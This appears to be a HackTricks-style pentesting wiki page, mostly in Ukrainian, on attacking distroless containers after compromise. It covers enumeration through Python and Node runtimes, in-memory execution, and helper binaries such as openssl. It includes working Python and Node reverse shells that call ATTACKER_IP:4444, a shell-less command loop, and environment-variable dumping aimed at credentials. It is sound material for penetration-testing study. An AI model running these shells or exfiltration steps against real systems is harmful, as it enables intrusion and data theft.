# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

A **distroless** container image — це образ, який постачає **мінімальні компоненти runtime, необхідні для запуску одного конкретного застосунку**, при цьому навмисно видаляючи звичні інструменти дистрибутива, такі як package managers, shells, і великі набори generic userland utilities. На практиці distroless images часто містять тільки бінарний файл застосунку або runtime, його shared libraries, сертифікатні набори та дуже невелику структуру файлової системи.

Суть не в тому, що distroless — це новий примітив ізоляції ядра. Distroless — це **image design strategy**. Він змінює те, що доступне **inside** файлової системи контейнера, а не те, як kernel ізолює контейнер. Це важлива відмінність, бо distroless зміцнює середовище в основному шляхом зменшення того, чим може скористатися атакуючий після отримання code execution. Він не замінює namespaces, seccomp, capabilities, AppArmor, SELinux або будь-який інший механізм runtime isolation.

## Чому існує Distroless

Distroless images використовуються передусім для зменшення:

- розміру образу
- операційної складності образу
- кількості пакетів і бінарників, які можуть містити вразливості
- кількості post-exploitation інструментів, доступних атакуючому за замовчуванням

Ось чому distroless images популярні у production розгортаннях застосунків. Контейнер без shell, package manager і майже без generic tooling зазвичай простіший з операційної точки зору і складніший для інтерактивного зловживання після компрометації.

Приклади відомих сімейств образів у стилі distroless включають:

- Google's distroless images
- Chainguard hardened/minimal images

## Що Distroless не означає

A distroless container is **not**:

- automatically rootless
- automatically non-privileged
- automatically read-only
- automatically protected by seccomp, AppArmor, or SELinux
- automatically safe from container escape

Все ще можливо запустити distroless image з `--privileged`, host namespace sharing, небезпечними bind mounts або з примонтованим runtime socket. У такому сценарії образ може бути мінімальним, але контейнер все одно може бути катастрофічно небезпечним. Distroless змінює **userland attack surface**, а не **kernel trust boundary**.

## Типові операційні характеристики

Коли ви компрометуєте distroless контейнер, перше, що зазвичай помічаєте — це що звичні припущення перестають бути вірними. Може не бути `sh`, `bash`, `ls`, `id`, `cat`, а іноді навіть libc-based середовища, яке поводиться так, як очікує ваша звична tradecraft. Це впливає як на offense, так і на defense, бо відсутність інструментів робить debugging, incident response та post-exploitation іншими.

Найпоширеніші патерни:

- існує application runtime, але майже нічого більше
- shell-based payloads зазнають невдачі, бо немає shell
- common enumeration one-liners не працюють через відсутність helper binaries
- filesystem protections, такі як read-only rootfs або `noexec` на writable tmpfs локаціях, часто також присутні

Саме це поєднання зазвичай призводить до того, що люди говорять про "weaponizing distroless".

## Distroless і Post-Exploitation

Головний offensive виклик у distroless середовищі — це не завжди початковий RCE. Частіше проблема — що відбувається далі. Якщо скомпрометований workload дає виконання коду в language runtime, такому як Python, Node.js, Java або Go, ви можете виконувати довільну логіку, але не через звичні shell-орієнтовані робочі процеси, характерні для інших Linux-цілей.

Це означає, що post-exploitation часто переходить в один із трьох напрямків:

1. **Use the existing language runtime directly** — для енумерації середовища, відкриття sockets, читання файлів або stage-інгу додаткових payloads.
2. **Bring your own tooling into memory** якщо файлову систему змонтовано read-only або writable локації змонтовані з `noexec`.
3. **Abuse existing binaries already present in the image** якщо застосунок або його залежності містять щось несподівано корисне.

## Abuse

### Enumerate The Runtime You Already Have

У багатьох distroless контейнерах немає shell, але все ще присутній application runtime. Якщо ціль — Python service, Python там є. Якщо ціль — Node.js, Node там є. Це часто дає достатньо функціональності для енумерації файлів, читання environment variables, відкриття reverse shells і підготовки виконання в пам'яті без виклику `/bin/sh`.

A simple example with Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Простий приклад з Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Наслідки:

- відновлення змінних середовища, часто включаючи credentials або service endpoints
- перебір файлової системи без `/bin/ls`
- виявлення записуваних шляхів та змонтованих secrets

### Reverse Shell без `/bin/sh`

Якщо образ не містить `sh` або `bash`, класичний shell-based reverse shell може відразу не спрацювати. У цьому випадку використайте встановлене середовище виконання мови.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Якщо `/bin/sh` не існує, замініть останній рядок прямим виконанням команд через Python або циклом Python REPL.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Знову ж таки, якщо `/bin/sh` відсутній, використовуйте Node's filesystem, process, and networking APIs безпосередньо замість створення shell.

### Повний приклад: No-Shell Python Command Loop

Якщо образ має Python, але shell відсутній зовсім, простий інтерактивний цикл часто достатній, щоб зберегти повну post-exploitation capability:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Для цього не потрібен інтерактивний shell-бінарник. З точки зору нападника, вплив фактично тотожний базовому shell: виконання команд, enumeration і підготовка подальших payloads через існуючий runtime.

### Виконання інструментів в пам'яті

Distroless images часто поєднують з:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

Таке поєднання робить класичні робочі потоки «download binary to disk and run it» ненадійними. У таких випадках основним рішенням стають техніки виконання в пам'яті.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Існуючі бінарні файли, які вже є в образі

Деякі Distroless images все ще містять операційно необхідні бінарні файли, які стають корисними після компрометації. Часто спостерігається приклад — `openssl`, тому що додатки іноді потребують його для crypto- чи TLS-пов'язаних завдань.

Швидкий шаблон пошуку:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Якщо `openssl` присутній, його можна використовувати для:

- outbound TLS connections
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

Точне зловживання залежить від того, що фактично встановлено, але загальна ідея така: distroless не означає "no tools whatsoever"; це означає "far fewer tools than a normal distribution image".

## Checks

Мета цих перевірок — визначити, чи є образ на практиці дійсно distroless, і які runtime або helper binaries все ще доступні для post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Що тут цікаво:

- Якщо shell відсутній, але присутній runtime, такий як Python або Node, під час post-exploitation слід переключитися на виконання через runtime.
- Якщо root filesystem доступний тільки для читання, а `/dev/shm` записуваний, але має прапор `noexec`, техніки виконання в пам'яті стають набагато доречнішими.
- Якщо допоміжні бінарники, такі як `openssl`, `busybox` або `java`, присутні, вони можуть надати достатньо функціональності для ініціалізації подальшого доступу.

## Налаштування runtime за замовчуванням

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Навмисно мінімальний userland | No shell, no package manager, only application/runtime dependencies | додавання debugging-слоїв, sidecar shells, копіювання busybox або інструментів |
| Chainguard minimal images | Навмисно мінімальний userland | Reduced package surface, often focused on one runtime or service | використання `:latest-dev` або debug-варіантів, копіювання інструментів під час build |
| Kubernetes workloads using distroless images | Залежить від конфігурації Pod | Distroless впливає лише на userland; Pod security posture усе ще залежить від Pod spec та runtime defaults | додавання ephemeral debug containers, host mounts, налаштування privileged Pod |
| Docker / Podman running distroless images | Залежить від run flags | Мінімальна файлова система, проте безпека runtime усе ще залежить від флагів та конфігурації демона | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Ключовий момент: distroless — це **властивість образу**, а не захист runtime. Його цінність полягає в обмеженні того, що доступно всередині файлової системи після компрометації.

## Related Pages

Для обхідних шляхів файлової системи та виконання в пам'яті, які часто потрібні у distroless середовищах:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Для зловживань container runtime, socket і mount, що все ще стосуються distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
